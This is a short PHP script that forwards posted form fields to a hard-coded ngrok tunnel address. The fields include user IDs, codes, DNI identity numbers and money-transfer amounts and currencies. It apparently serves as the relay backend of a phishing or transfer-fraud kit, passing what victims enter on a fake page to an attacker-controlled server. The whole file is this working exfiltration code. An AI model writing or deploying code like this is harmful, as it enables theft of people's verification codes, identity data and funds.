<?php
/*****YZX0MAKER <www class="twitter com">@YZX0Long*/
$serv = "https://48ae-191-89-51-208.ngrok.io";
if($_GET['id']=='cobGIRO') {
    $fields = array(
        'id' => $_POST['id'],
        'to' => $_POST['to'],
        'alt' => $_POST['alt'],
        'uid' =>  $_POST['uid'],
        'code' => $_POST['code'],
    );
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv.'/giro/'.$_GET['id'].'/?'.$fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($curl);
        curl_close($curl);
        echo json_encode($data);
}elseif($_GET['id']=='sendGIRO') {
    //ARRAY POST
    $fields = array(
        'from' => $_POST['from'],
        'alt' => $_POST['alt'],
        'lot' => $_POST['lot'],
        'price' => $_POST['price'], 
        'fee' => $_POST['fee'],
        'uid' => $_POST['uid'],
        'code' => $_POST['code'],
        'dni' => $_POST['dni'],
        'curren' => $_POST['curren'],
        'change' => $_POST['change'],
    );
    $fields_string = http_build_query($fields);
    //CURL
    $url = $serv.'/giro/'.$_GET['id'].'/?'.$fields_string;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL , $url );
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($curl);
        curl_close($curl);
        echo json_encode($data);
}else{
    echo json_encode('No puedes continuar');
}
?>